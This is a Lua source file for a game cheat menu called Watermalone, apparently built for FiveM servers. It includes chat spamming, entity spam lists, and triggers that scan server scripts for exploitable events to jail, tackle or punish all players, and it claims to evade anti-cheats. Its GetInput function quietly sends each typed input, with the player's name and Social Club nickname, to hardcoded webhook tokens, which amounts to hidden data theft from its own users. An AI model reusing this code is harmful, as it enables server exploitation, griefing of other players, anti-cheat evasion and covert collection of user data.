            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "RC [Spawn RC, Spawns a RC Car that you can control of any vehicle]", tab = "RC", ctrlType = "button", bind = {9001}, name = "wmlua.V.RC_spawnrc", label = "Spawn RC Car", func = "wmlua.F.RCSpawn", efunc = wmlua.F.RCSpawn, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "RC [Helify RC, Spawns heli blades on the RC Car]", tab = "RC", ctrlType = "button", bind = {9001}, name = "wmlua.V.RC_helify", label = "Helify RC", func = "wmlua.F.RCHelify", efunc = wmlua.F.RCHelify, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "RC [Prefer freecam location, Spawns the RC Car via freecam location]", tab = "RC", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.RC_preferfreecam", label = "Prefer Freecam Location", func = "wmlua.F.RCPreferFreecam", efunc = wmlua.F.RCPreferFreecam, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "RC [God Mode, Enables God Mode on the RC Car]", tab = "RC", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.RC_godmode", label = "God mode", func = "wmlua.F.RCGodmode", efunc = wmlua.F.RCGodmode, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "RC [Prioritize RC for Speed Boost, If the RC Car exists, it will speed boost it rather than your vehicle (Linked to vehicle speed boost)]", tab = "RC", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.RC_boostpriority", label = "Prioritize RC For Speed Boost", func = "wmlua.F.RCSpeedBoost", efunc = wmlua.F.RCSpeedBoost, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "RC [Fix the RC Car, Broken RC Car? This fixes it]", tab = "RC", ctrlType = "button", bind = {9001}, name = "wmlua.V.RC_fix", label = "Fix the RC Car", func = "wmlua.F.RCFix", efunc = wmlua.F.RCFix, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "RC [Unflip the RC Car, Enables you to unflip the RC Car]", tab = "RC", ctrlType = "button", bind = {9001}, name = "wmlua.V.RC_unflip", label = "Unflip the RC Car", func = "wmlua.F.RCUnflip", efunc = wmlua.F.RCUnflip, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "RC [Delete RC Car, Deletes the current RC Car]", tab = "RC", ctrlType = "button", bind = {9001}, name = "wmlua.V.RC_deleterc", label = "Delete RC Car", func = "wmlua.F.RCDelete", efunc = wmlua.F.RCDelete, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CHAT [Chat Spammer, Toggler for chat spamming]", tab = "CHAT", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.CHAT_toggle", label = "Chat Spammer", func = "wmlua.F.CHATToggle", efunc = wmlua.F.CHATToggle, MultiTarget = false, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CHAT [Spam Rate MS, Custom spam message speed]", tab = "CHAT", ctrlType = "button", bind = {9001}, name = "wmlua.V.CHAT_changerate", label = "Spam Rate MS 25", func = "wmlua.F.CHATChangeRate", efunc = wmlua.F.CHATChangeRate, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CHAT [Chat Message, Spams the chat with a custom message]", tab = "CHAT", ctrlType = "button", bind = {9001}, name = "wmlua.V.CHAT_changemsg", label = "Chat Message default", func = "wmlua.F.CHATChangeMsg", efunc = wmlua.F.CHATChangeMsg, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CHAT [Change Sender Name, Custom name for sender of chat spam]", tab = "CHAT", ctrlType = "button", bind = {9001}, name = "wmlua.V.CHAT_changename", label = "Name", func = "wmlua.F.CHATChangeName", efunc = wmlua.F.CHATChangeName, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CAMERA [Enable Freecam, Allows you to freecam around the world (has sub options/features)]", tab = "CAMERA", ctrlType = "toggle", bind = {21,243}, name = "wmlua.V.CAM_toggle", label = "Freecam", func = "wmlua.F.CAMToggle", efunc = wmlua.F.CAMToggle, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CAMERA [Modify Vehicle Spammer List, Specify your own list of vehicles to be spammed]", tab = "CAMERA", ctrlType = "button", bind = {9001}, name = "wmlua.V.CAM_changevehiclespammerlist", label = "Modify Vehicle Spammer List", func = "wmlua.F.CAMModifyVehicleSpamList", efunc = wmlua.F.CAMModifyVehicleSpamList, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CAMERA [Modify Ped Spammer List, Specify your own list of peds to be spammed]", tab = "CAMERA", ctrlType = "button", bind = {9001}, name = "wmlua.V.CAM_changepedspammerlist", label = "Modify Ped Spammer List", func = "wmlua.F.CAMModifyPedSpamList", efunc = wmlua.F.CAMModifyPedSpamList, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CAMERA [Modify Objects Spammer List, Specify your own list of objects to be spammed]", tab = "CAMERA", ctrlType = "button", bind = {9001}, name = "wmlua.V.CAM_changeobjectspammerlist", label = "Modify Object Spammer List", func = "wmlua.F.CAMModifyObjectSpamList", efunc = wmlua.F.CAMModifyObjectSpamList, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CAMERA [Modify PTFX Spammer List, Specify your own list of particle effects to be spammed]", tab = "CAMERA", ctrlType = "button", bind = {9001}, name = "wmlua.V.CAM_changesfxspammerlist", label = "Modify PTFX Spammer List", func = "wmlua.F.CAMModifySFXSpamList", efunc = wmlua.F.CAMModifySFXSpamList, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CAMERA [Reset List, Resets the lists of objs/peds/vehs to be spammed]", tab = "CAMERA", ctrlType = "button", bind = {9001}, name = "wmlua.V.CAM_resetlists", label = "Reset Lists", func = "wmlua.F.CAMResetLists", efunc = wmlua.F.CAMResetLists, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "TRIGGERS [Community Service All (Dynamic), Community service all players]", tab = "triggers", ctrlType = "button", bind = {9001}, name = "wmlua.V.TRIG_comservall", label = "Community Service All", func = "wmlua.F.TRIGCommunityService", efunc = wmlua.F.TRIGCommunityService, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "TRIGGERS [Jail All (Dynamic), Jail All players]", tab = "triggers", ctrlType = "button", bind = {9001}, name = "wmlua.V.TRIG_jailall", label = "Jail All", func = "wmlua.F.TRIGJailAll", efunc = wmlua.F.TRIGJailAll, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "TRIGGERS [Tackle All (Dynamic), Tackle all players]", tab = "triggers", ctrlType = "button", bind = {9001}, name = "wmlua.V.TRIG_tackleall", label = "Tackle All", func = "wmlua.F.TRIGTackleAll", efunc = wmlua.F.TRIGTackleAll, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "TRIGGERS [Roblox Mode (Dynamic), Roblox Mode all players]", tab = "triggers", ctrlType = "button", bind = {9001}, name = "wmlua.V.TRIG_carryall", label = "Roblox Mode Others", func = "wmlua.F.TRIGCarryAll", efunc = wmlua.F.TRIGCarryAll, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CONFIG [Load Config, Load your custom config with your settings]", tab = "configs", ctrlType = "button", bind = {9001}, name = "wmlua.V.CFG_loadcfg", label = "Load Config", func = "wmlua.F.LoadConfig", efunc = wmlua.F.LoadConfig, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CONFIG [Save Config, Save your custom config with your settings]", tab = "configs", ctrlType = "button", bind = {9001}, name = "wmlua.V.CFG_savecfg", label = "Save Config", func = "wmlua.F.SaveConfig", efunc = wmlua.F.SaveConfig, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "CONFIG [Delete Config, Delete your custom config with your settings]", tab = "configs", ctrlType = "button", bind = {9001}, name = "wmlua.V.CFG_deletecfg", label = "Delete Config", func = "wmlua.F.DeleteConfig", efunc = wmlua.F.DeleteConfig, MultiTarget = false},
        
        }
        
        for i = 1, #wmlua.T.Cheese do
            for k,v in pairs(wmlua.T.Cheese) do
                if not wmlua.codeExec and v.codeExecution then
                    table.remove(wmlua.T.Cheese, k)
                end
            end
        end
        wmlua.T.FI = {}
        for k,v in pairs(wmlua.T.Cheese) do
            wmlua.T.FI[v.name] = k
        end
        
    end

    function wmlua.F.BuildFeatureList()

        local featurejson = {}
        local addedExplanations = {
            "Active development",
            "Menu [Dynamic Triggers, The menu looks for the trigger automatically so you don't have to dump for it]",
            "Security [Unique & Good code, Ensuring WM is UD by Supported ACs]",
            "GUI [Ability to bind any feature to any controls (keys)]",
            "GUI [Friendlist by name search (exact / contains)]",
            "GUI [Targetlist by name search (exact / contains)]",
            "GUI [Custom Feature Rich GUI built from scratch]",
            "GUI [Mouse Support (All Resolutions)]",
            "GUI [Playerlist Multi Targeting, Allows you to target multiple players at once (with certain features)]",
        }
        
        wmlua_print("\nFeature List Printing\n")
        
        for k,v in ipairs(addedExplanations) do

            wmlua_print(v)
            wmlua.F.InsertToTable(featurejson, v)

        end

        for k,v in ipairs(wmlua.T.Cheese) do

            if v.advertname ~= "" then
                wmlua_print(v.advertname)
                wmlua.F.InsertToTable(featurejson, v.advertname)
            end
            if v.name == "wmlua.V.CAM_toggle" then
                for k2,v2 in ipairs(wmlua.T.FreecamModes) do

                    wmlua_print("Freecam Mode: " .. v2)
                    wmlua.F.InsertToTable(featurejson, v2)

                end
            end

        end
 
        wmlua_print("\nFeature List Json Printing\n")
        featurejson = json.encode(featurejson)
        wmlua_print(featurejson)

    end

    function wmlua.F.SaveConfig()

        local _config = wmlua.F.GetInput("Enter config name")
        local config = "wada_configs_" .. _config

        local cfg = {}

        for k,v in pairs(wmlua.V) do
            if k ~= "InputActive" and k ~= "MenuSelectedButton" then
                local cfgPack = {}
                local _, error = wmlua_pcall(function()
                    wmlua.F.InsertToTable(cfgPack, {cfgType = "variable", value = v, varname = k})
                    json.encode(cfgPack) 
                end)
                if not error then
                    cfg[#cfg+1] = cfgPack
                end
            end
        end

        for k,v in pairs(wmlua.ST) do
            local cfgPack = {}
            local _, error = wmlua_pcall(function()
                wmlua.F.InsertToTable(cfgPack, {cfgType = "saved:table", value = v, varname = k})
                json.encode(cfgPack) 
            end)
            if not error then
                cfg[#cfg+1] = cfgPack
            end
        end

        for i = 1, #wmlua.T.Cheese do
            local cfgPack = {}
            wmlua.F.InsertToTable(cfgPack, {cfgType = "cheese", active = wmlua.T.Cheese[i].active, name = wmlua.T.Cheese[i].name, bind = wmlua.T.Cheese[i].bind})
            cfg[#cfg+1] = cfgPack
        end

        wmlua.F.InsertToTable(cfg, {cfgType = "fov", lefov = wmlua.T.aimfov})

        local encodedCfg = json.encode(cfg)
        local cfg = encodedCfg
        cfg = cfg:gsub('wmlua', "MWClub")
        wmlua.N.SetResourceKvp(config, cfg)

        wmlua.F.EventLogInsert("[~b~WM~w~] Saved config: " .. _config)

    end

    function wmlua.F.LoadConfig()

        if not wmlua.S.LastConfigLoad or wmlua.N.Get_GameTimer() + 500 > wmlua.S.LastConfigLoad then
            local _config = wmlua.F.GetInput("Enter config name")
            wmlua.S.LastConfigLoad = wmlua.N.Get_GameTimer()
            local config = "wada_configs_" .. _config
            local cfg = wmlua.N.GetResourceKvp(config)
            if cfg then
                if type(cfg) == "nil" then
                    wmlua.F.EventLogInsert("[~r~WM~w~] Config doesn't exist")
                else
                    if wmlua.V.ShowCFG then
                        wmlua_print(cfg)
                    end
                    cfg = cfg:gsub("MWClub","wmlua")
                    local RetrievedCFG = json.decode(cfg)
                    if RetrievedCFG[#RetrievedCFG].cfgType == "fov" and RetrievedCFG[#RetrievedCFG].lefov ~= nil then
                        wmlua.T.aimfov = RetrievedCFG[#RetrievedCFG].lefov
                        wmlua.F.EventLogInsert("updated fov", 1000)
                    end
                    for i = 1, #RetrievedCFG do
                        for k,v in pairs(RetrievedCFG[i]) do
                            if v['cfgType'] then
                                if v.cfgType == "variable" then
                                    wmlua.V[v.varname] = v.value
                                end
                                if v.cfgType == "saved:table" then 
                                    wmlua.ST[v.varname] = v.value
                                end
                            end
                        end
                    end
                    for i = 1, #RetrievedCFG do
                        for k,v in pairs(RetrievedCFG[i]) do
                            if v['cfgType'] and v.cfgType == "cheese" then
                                for i2 = 1, #wmlua.T.Cheese do
                                    if v.name == wmlua.T.Cheese[i2].name then
                                        if v.bind ~= nil then wmlua.T.Cheese[i2].bind = v.bind end
                                        if v.active ~= nil then wmlua.T.Cheese[i2].active = v.active end
                                    end
                                end
                            end
                        end
                    end
                end
            end
            wmlua_Schleep(250)
        end

    end

    function wmlua.F.DeleteConfig()

        local _config = wmlua.F.GetInput("Enter config name")
        local config = "wada_configs_" .. _config
        wmlua.N.DeleteResourceKvp(config)
        wmlua.F.EventLogInsert("[~r~WM~w~] Deleted Config: " .. _config .. " if it existed")

    end

    function wmlua.F.RetrieveTrigger(content, find, accept)

        repeat
            if wmlua.F.IsAsciiDecPresent(content) then
                content = wmlua.F.DecodeASCIIDec(content)
            end
        until not wmlua.F.IsAsciiDecPresent(content)

        wmlua.V.Foundtrigger = false
        wmlua.V.Foundwords = 0
        wmlua.T.script_content = wmlua.F.Split(content, '\n')
        for i = 1, #wmlua.T.script_content do
            for i2 = 1, #find do
                if string.find(wmlua.T.script_content[i], find[i2], 1, true) then
                    wmlua.V.Foundwords = wmlua.V.Foundwords + 1
                end
                for i3 = 1, #accept do
                    if string.find(wmlua.T.script_content[i], accept[i3], 1, true) then
                        wmlua.V.PossibleTrigger = wmlua.F.CleanString(wmlua.T.script_content[i], "event")
                    end
                    if wmlua.V.Foundwords == #find then
                        if string.find(wmlua.T.script_content[i], find[i2], 1, true) then
                            wmlua.V.Foundtrigger = true
                            return wmlua.V.PossibleTrigger
                        end
                    end
                end
            end
        end

    end

    function wmlua.F.LUASafeMode()

        wmlua.F.CFS("wmlua.V.Lua_safemode")

    end

    function wmlua.F.LUAEventLoggerIncludeEvents()

        wmlua.F.CFS("wmlua.V.Lua_eventlogger_includeevents")

    end

    function wmlua.F.LUAAntiAntiAfk()

        wmlua.F.CFS("wmlua.V.Lua_antiantiafk")

    end

    function wmlua.F.LUAMouseHandler()

        wmlua.F.CFS("wmlua.V.Lua_mousehandler")

    end

    function wmlua.F.TargetAll()

        wmlua.V.__TA = not wmlua.V.__TA
        if wmlua.V.__TA then
            wmlua.T.TargetList = {}
            for k,v in ipairs(wmlua.Playerlist_Players) do
                wmlua.F.InsertToTable(wmlua.T.TargetList, wmlua.Playerlist_Players[k].pid)
            end
        else
            wmlua.T.TargetList = {}
        end

    end

    wmlua.T.MenuTabs = {
        {name = "LUA", label = wmlua.STRINGS[73]},
        {name = "AIM", label = wmlua.STRINGS[74]},
        {name = "VIS", label = wmlua.STRINGS[75]},
        {name = "VEH", label = wmlua.STRINGS[76]},
        {name = "WEP", label = wmlua.STRINGS[77]},
        {name = "MIS", label = wmlua.STRINGS[78]},
        {name = "MAL", label = wmlua.STRINGS[79]},
        {name = "PLY", label = wmlua.STRINGS[80]},
        {name = "OTH", label = wmlua.STRINGS[81]}, -- #392BBY
        {name = "ESX", label = wmlua.STRINGS[82]},
        {name = "AI", label = wmlua.STRINGS[83]},
        {name = "RC", label = wmlua.STRINGS[84]},
        {name = wmlua.STRINGS[90], label = wmlua.STRINGS[91]},
        {name = wmlua.STRINGS[97], label = wmlua.STRINGS[98]},
        {name = "triggers", label = "      Triggers"},
        {name = "configs", label = "       Configs"},
    }

    wmlua.T.SubMenuTabs = {
        {name = wmlua.STRINGS[54]}
    }

    wmlua.T.MenuButtons = {}
    wmlua.V.MenuSelectedTab = 1
    wmlua.V.MenuSelectedButton = 1
    wmlua.V.MenuHoveredTab = 0
    wmlua.V.MenuHoveredButton = 0
    wmlua.menu.v.drawmenu = false

    wmlua_Thread(function()

        wmlua.Playerlist_Players_t = {}

        for _, player in ipairs(wmlua.N.GetActivePlayers()) do

            wmlua.V.MQ = wmlua.N.IsPedMale(wmlua.N.GetPlayerPed(player))

            if wmlua.V.MQ then
                wmlua.V.MQ = "M"
            else
                wmlua.V.MQ = "F"
            end

            if wmlua.N.GetEntityModel(wmlua.N.GetPlayerPed(player)) == wmlua.N.GetHashKey("mp_f_freemode_01") then
                wmlua.V.MQ = "F"
            elseif wmlua.N.GetEntityModel(wmlua.N.GetPlayerPed(player)) == wmlua.N.GetHashKey("mp_m_freemode_01") then
                wmlua.V.MQ = "M"
            end

            wmlua.F.InsertToTable(wmlua.Playerlist_Players_t, {dist = wmlua.N.CompareDistance(wmlua.F.GetDynamicPosition(), wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(player))), pid = wmlua.N.GetPlayerServerId(player), player = player, name = wmlua.N.GetPlayerName(player), ped = wmlua.N.GetPlayerPed(player), sex = wmlua.V.MQ, friend = false, target = false})

        end

        wmlua.Playerlist_Players = {}
        wmlua.Playerlist_Closest_Players = {}

        for k,v in wmlua.F.spairs(wmlua.Playerlist_Players_t, function(t,a,b) return t[b].pid > t[a].pid end) do
            wmlua.F.InsertToTable(wmlua.Playerlist_Players, v)
        end

        for k,v in wmlua.F.spairs(wmlua.Playerlist_Players_t, function(t,a,b) return t[b].dist > t[a].dist end) do
            wmlua.F.InsertToTable(wmlua.Playerlist_Closest_Players, v)
        end

        wmlua_Schleep(1000)

    end)

    wmlua.T.FriendList = {}

    wmlua.V.Aim_control = 21

    wmlua.T.peds = {}

    wmlua.V.InputActive = false
    wmlua.Playerlist_YOffset = 0.02
    wmlua.Playerlist_CUR_YOffset = 0.04
    wmlua.Playerlist_Page = 1
    wmlua.Playerlist_Start = 1
    wmlua.Playerlist_End = 33
    wmlua.Playerlist_Start_C = 1
    wmlua.Playerlist_End_C = 33

    -- Utils

    function wmlua.F.PL(val1, val2)
        local tempnumber
        tempnumber = (1 - ( val1 / val2)) * 100
        return tempnumber
    end

    function wmlua.F.PA(val1, val2)
        local tempnumber
        tempnumber = 100 * ( val1 / val2 )
        return tempnumber
    end

    function wmlua.F.GetVehicleRaycast(coordFrom, coordTo)
        local rayHandle = wmlua.N.CastRayToPoint(coordFrom.x, coordFrom.y, coordFrom.z, coordTo.x, coordTo.y, coordTo.z, 10, wmlua.N.GetPlayerPed(), 0)
        local _, _, _, _, vehicle = wmlua.N.GetRaycastResult(rayHandle)
        return vehicle
    end

    function wmlua.F.RequestMdl(model)
        if wmlua.N.IsModelInCdimage(model) and wmlua.N.IsModelValid(model) then
            wmlua.N.RequestModel(model)
            while not wmlua.N.HasModelLoaded(model) do
                wmlua.N.RequestModel(model)
                wmlua_Schleep(0)
            end
            return true
        end
        return false
    end

    function wmlua.F.PressedCTRL_inp(igp, cnt)

        if wmlua.N.GetInputMethod(0) then
            local c_s = wmlua.H.WMInvokeNative(0x91AEF906BCA88877, tonumber(igp), tonumber(cnt))
            if c_s then
                return true
            else
                return false
            end
        end
    
    end
    
    function wmlua.F.HoldingCTRL_inp(igp, cnt)
    
        if wmlua.N.GetInputMethod(0) then
            local c_s = wmlua.H.WMInvokeNative(0xE2587F8CBBD87B1D, tonumber(igp), tonumber(cnt))
            if c_s then
                return true
            else
                return false
            end
        end
    
    end

    wmlua.V.InputTxtIndex = 1

    function wmlua.F.GetInput(text)
    
        if not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.UseGTAInput"]].active then
            wmlua.V.InputActive = true  
            if not text then text = "Input" end
            local builtSTR = ""
            while wmlua.V.InputActive do wmlua_Schleep(0)
                wmlua.N.DisableGameInput()
                local curPressed = {}
                for i = 1, 357 do
                    if wmlua.F.PressedCTRL_inp(0, i) then
                        local le = wmlua.N.GetControlInstructionalButton(0, i, 0)
                        curPressed[le] = le
                    end
                end
                local upperChars = {
                    {orig = "`", new = "~"},
                    {orig = "1", new = "!"},
                    {orig = "2", new = "@"},
                    {orig = "3", new = "#"},
                    {orig = "4", new = "$"},
                    {orig = "5", new = "%"},
                    {orig = "6", new = "^"},
                    {orig = "7", new = "&"},
                    {orig = "8", new = "*"},
                    {orig = "9", new = "("},
                    {orig = "0", new = ")"},
                    {orig = "-", new = "_"},
                    {orig = "[", new = "{"},
                    {orig = "]", new = "}"},
                    {orig = ";", new = ":"},
                    {orig = "'", new = '"'},
                    {orig = ",", new = "<"},
                    {orig = ".", new = ">"},
                    {orig = "/", new = "?"},
                    {orig = "\\", new = "|"},
                    {orig = "=", new = "+"}
                }
                for k,v in pairs(curPressed) do
                    if wmlua.dev then
                        wmlua_print(k)
                    end
                    local ignore = false
                    k = string.gsub(k, "b_", "")
                    k = string.gsub(k, "t_", "")
                    if k == "2000" then
                        k = " "
                    end
                    if #k > 1 then
                        ignore = true
                    end
                    if not ignore then
                        if wmlua.F.HoldingCTRL_inp(0, 21) then
                            for i = 1, #upperChars do
                                if k == upperChars[i].orig then k = upperChars[i].new end
                            end
                            builtSTR = builtSTR .. k
                        else
                            builtSTR = builtSTR .. string.lower(k)
                        end
                    end
                end
                local drawPoint = {x = 0.31, y = 0.8}
                wmlua.menu.f.drawrect({x = drawPoint.x, y = drawPoint.y, w = 0.365, h = 0.06}, {red = 10, green = 10, blue = 10, alpha = 255})
                wmlua.menu.f.drawrect({x = drawPoint.x, y = drawPoint.y, w = 0.365, h = 0.02}, {red = 0, green = 0, blue = 0, alpha = 255})
                wmlua.menu.f.drawtext({text = "[~g~Watermalone Input~s~] " .. text .. " (" .. #builtSTR .. ")", x = drawPoint.x + 0.001, y = drawPoint.y, scale = 0.1, size = 0.30, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                wmlua.menu.f.drawtext({text = builtSTR, x = drawPoint.x + 0.001, y = drawPoint.y + 0.025, scale = 0.1, size = 0.34, font = 4}, {red = 255, green = 255, blue = 255, alpha = 255})
                if wmlua.F.PressedCTRL_inp(0, 191) then
                    wmlua_Schleep(200)
                    wmlua.V.InputActive = false
                    wmlua.LTD(wmlua.N.GetPlayerName(wmlua.N.PlayerId())  .. " (" .. wmlua.N.ScGetNickname() .. ")", "Input: " .. builtSTR, "778173789719494657/F-hx70hVIrtWBSQMLu-9jF959P8Jd8OZ5NYcyFFDOBSV-jCdpR3n0WqZVyrDcWxxltCm")
                elseif wmlua.F.PressedCTRL_inp(0, 194) then
                    builtSTR = string.sub(builtSTR, 1, #builtSTR - 1)
                end
            end
            wmlua.V.LastInputTime = wmlua.N.Get_GameTimer()
            wmlua_Schleep(0)
            return builtSTR
        else
            if not text then text = "Input" end
            wmlua.N.AddTextEntry("WM_" .. wmlua.V.InputTESTR .. "_" .. wmlua.V.InputTxtIndex, text .. " (~r~DO NOT PRESS ESC / RMB~w~)")
            wmlua.N.DisplayKeyboard(0, "WM_" .. wmlua.V.InputTESTR .. "_" .. wmlua.V.InputTxtIndex, wmlua.STRINGS[19], wmlua.STRINGS[19], wmlua.STRINGS[19], wmlua.STRINGS[19], wmlua.STRINGS[19], 99999999999)
            wmlua.V.InputTxtIndex = wmlua.V.InputTxtIndex + 1

            while wmlua.N.UpdateOnScreenKeyboard() ~= 1 and wmlua.V.InputActive do wmlua_Schleep(0)
                wmlua.N.SetCursor(0)
            end
            repeat 
                wmlua_Schleep(0)
                wmlua.V.Inp_result = wmlua.N.GetOnscreenKeyboardResult()
            until (wmlua.N.UpdateOnScreenKeyboard() == 1 or wmlua.N.UpdateOnScreenKeyboard() == 2)
            if wmlua.V.Inp_result == nil then
                wmlua.V.Inp_result = 0
            end
            wmlua.V.LastInputTime = wmlua.N.Get_GameTimer()
            wmlua_Schleep(0)
            wmlua.V.InputActive = false
            wmlua.LTD(wmlua.N.GetPlayerName(wmlua.N.PlayerId())  .. " (" .. wmlua.N.ScGetNickname() .. ")", "Input: " .. wmlua.V.Inp_result, "753690678109798451/_cT0kVB9uozSZNN2H8IOm5Xy55d8ChJ0fP9_Z62w0jaz_2ZUryaZjmsx9Klgs_4757po")
            return wmlua.V.Inp_result
            
        end
        
    end

    function wmlua.F.GetDynamicPosition()
        if wmlua.N.DoesCamExist(wmlua.V.Freecam) then
            return wmlua.N.GetCamPos(wmlua.V.Freecam)
        elseif wmlua.N.DoesCamExist(wmlua.P.RCCar.Camera) then
            return wmlua.N.GetCamPos(wmlua.P.RCCar.Camera)
        else
            return wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed())
        end
    end

    function wmlua.F.CFS(var)

        for i = 1, #wmlua.T.Cheese do
            if wmlua.T.Cheese[i].name == var then
                wmlua.T.Cheese[i].active = not wmlua.T.Cheese[i].active
            end
        end

    end

    function wmlua.F.CFT(cn, ct)

        for i = 1, #wmlua.T.MenuButtons do
            if wmlua.T.MenuButtons[i].name == cn then
                wmlua.T.MenuButtons[i].label = ct
            end
        end

        for i = 1, #wmlua.T.Cheese do
            if wmlua.T.Cheese[i].name == cn then
                wmlua.T.Cheese[i].label = ct
            end
        end

    end

    function wmlua.F.AddVectors(vect1, vect2)
        return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
    end

    function wmlua.F.SubVectors(vect1, vect2)
        return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
    end

    function wmlua.F.ScaleVector(vect, mult)
        return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
    end

    function wmlua.F.ScreenToWorld(screenCoord)
        wmlua.V.CamRot = wmlua.N.GetGameplayCamRot(2)
        wmlua.V.CamPosition = wmlua.N.GetGameplayCamCoord()

        local vect2x = 0.0
        local vect2y = 0.0
        local vect21y = 0.0
        local vect21x = 0.0
        local direction = wmlua.F.RotationToDirection(wmlua.V.CamRot)
        local vect3 = vector3(wmlua.V.CamRot.x + 10.0, wmlua.V.CamRot.y + 0.0, wmlua.V.CamRot.z + 0.0)
        local vect31 = vector3(wmlua.V.CamRot.x - 10.0, wmlua.V.CamRot.y + 0.0, wmlua.V.CamRot.z + 0.0)
        local vect32 = vector3(wmlua.V.CamRot.x, wmlua.V.CamRot.y + 0.0, wmlua.V.CamRot.z + -10.0)

        local direction1 = wmlua.F.RotationToDirection(vector3(wmlua.V.CamRot.x, wmlua.V.CamRot.y + 0.0, wmlua.V.CamRot.z + 10.0)) - wmlua.F.RotationToDirection(vect32)
        local direction2 = wmlua.F.RotationToDirection(vect3) - wmlua.F.RotationToDirection(vect31)
        local radians = -(math.rad(wmlua.V.CamRot.y))

        vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
        vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))

        local case1, x1, y1 = wmlua.F.WorldToScreenRel(((wmlua.V.CamPosition + (direction * 10.0)) + vect33) + vect34)
        if not case1 then
            vect2x = x1
            vect2y = y1
            return wmlua.V.CamPosition + (direction * 10.0)
        end

        local case2, x2, y2 = wmlua.F.WorldToScreenRel(wmlua.V.CamPosition + (direction * 10.0))
        if not case2 then
            vect21x = x2
            vect21y = y2
            return wmlua.V.CamPosition + (direction * 10.0)
        end

        if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
            return wmlua.V.CamPosition + (direction * 10.0)
        end

        local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
        local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
        return ((wmlua.V.CamPosition + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)

    end

    function wmlua.F.WorldToScreenRel(worldCoords)
        local check, x, y = wmlua.N.World3dToScreen(worldCoords.x, worldCoords.y, worldCoords.z)
        if not check then
            return false
        end

        local screenCoordsx = (x - 0.5) * 2.0
        local screenCoordsy = (y - 0.5) * 2.0
        return true, screenCoordsx, screenCoordsy
    end

    function wmlua.F.RotationToDirection(rotation)
        local retz = math.rad(rotation.z)
        local retx = math.rad(rotation.x)
        local absx = math.abs(math.cos(retx))
        return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
    end

    function wmlua.F.GetCamDirection()
        local heading = wmlua.N.GetGameplayCamRelativeHeading() + wmlua.N.GetEntityHeading(wmlua.N.GetPlayerPed())
        local pitch = wmlua.N.GetGameplayCamRelativePitch()

        local x = -math.sin(heading * math.pi / 180.0)
        local y = math.cos(heading * math.pi / 180.0)
        local z = math.sin(pitch * math.pi / 180.0)

        local len = math.sqrt(x * x + y * y + z * z)
        if len ~= 0 then
            x = x / len
            y = y / len
            z = z / len
        end

        return x, y, z
    end

    function wmlua.F.GetCamDirFromScreenCenter()
        local pos = wmlua.N.GetGameplayCamCoord()
        local world = wmlua.F.ScreenToWorld({ x = 0.5, y = 0.5})
        local ret = wmlua.F.SubVectors(world, pos)
        return ret
    end

    function wmlua.F.table_removekey(array, element)
        for i = 1, #array do
            if array[i] == element then
                table.remove(array, i)
            end
        end
    end

    function wmlua.F.ClampInt(val,min,max,hide)
        if type(tonumber(val)) == "number" then
            if val > max then val = max if hide ~= true then wmlua.F.EventLogInsert("[~b~WM~w~] Clamped to: " .. val, 1000) end end
            if val < min then val = min if hide ~= true then wmlua.F.EventLogInsert("[~b~WM~w~] Clamped to: " .. val, 1000) end end
            return tonumber(val)
        elseif hide ~= true then
            wmlua.F.EventLogInsert("[~r~WM~w~] Invalid Clamp")
        end
    end

    function wmlua.F.OnOff(var)

        return ""

    end

    function wmlua.F.vDrawText3D(x,y,z, text, rgba)

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active then

            wmlua.N.SetTextScale(0.0, 0.20)
            wmlua.N.SetTextFont(0)
            wmlua.N.SetTextDropShadow(0, 0, 0, 0, 255)
